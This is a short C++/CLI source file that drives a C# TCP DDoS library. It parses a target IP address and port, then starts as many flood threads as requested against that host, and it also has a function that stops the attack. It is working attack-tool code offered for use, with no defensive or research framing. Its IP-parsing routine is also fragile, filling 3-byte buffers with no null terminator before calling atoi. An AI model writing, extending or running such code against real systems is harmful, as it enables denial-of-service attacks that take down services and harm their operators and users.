#include "stdafx.h"
#include "TOOL.h"
#include <iostream>

int Init_CSharP_DLL_To_CPlusPlus_DLL(const char *IP, const int Port, int ThreadNumber)
{
	int _0IP = 0;
	int _1IP = 0;
	int _2IP = 0;
	int _3IP = 0;
	char _0StrIP[3] = { 0 };
	char _1StrIP[3] = { 0 };
	char _2StrIP[3] = { 0 };
	char _3StrIP[3] = { 0 };

	if (IP != NULL)
	{
		int IPLen = 0;
		while (IP[IPLen])
		{
			IPLen++;
			if (IPLen > 15)
			{
				return -1;
			}
		}
		int IPLen_To = 0;
		for (int i = 0; i < IPLen; i++)
		{
			if (IP[i] == '.')
			{
				IPLen_To = i + 1;
				break;
			}
			_0StrIP[i] = IP[i];
		}
		for (int i = 0; i < IPLen; i++)
		{
			if (IP[IPLen_To + i] == '.')
			{
				IPLen_To += i;
				break;
			}
			_1StrIP[i] = IP[IPLen_To + i];
		}
		for (int i = 0; i < IPLen; i++)
		{
			if (IP[IPLen_To + i + 1] == '.')
			{
				IPLen_To += (i + 1);
				break;
			}
			_2StrIP[i] = IP[IPLen_To + i + 1];
		}
		for (int i = 0; i < 3; i++)
		{
			if (IP[IPLen_To + i + 1] == 0 && i < 3)
			{
				break;
			}
			_3StrIP[i] = IP[IPLen_To + i + 1];
		}

	}

	_0IP = atoi(_0StrIP);
	_1IP = atoi(_1StrIP);
	_2IP = atoi(_2StrIP);
	_3IP = atoi(_3StrIP);
	std::cout << _0IP << std::endl;
	std::cout << _1IP << std::endl;
	std::cout << _2IP << std::endl;
	std::cout << _3IP << std::endl;

	for (int i = 0; i < ThreadNumber; i++)
	{
		CSharPDdos::DDOS ^DDOS_Loop = gcnew CSharPDdos::DDOS;
		DDOS_Loop->Init_DDos(_0IP, _1IP, _2IP, _3IP, Port);
		DDOS_Loop->Start_TCP_DDos();
	}

	return 0;
}

int Stop_CSharP_DLL_To_CPlusPlus_DLL_DDosAttack()
{
	CSharPDdos::DDOS ^DDOS_Loop = gcnew CSharPDdos::DDOS;
	DDOS_Loop->Stop_TCP_DDos();
	return 0;
}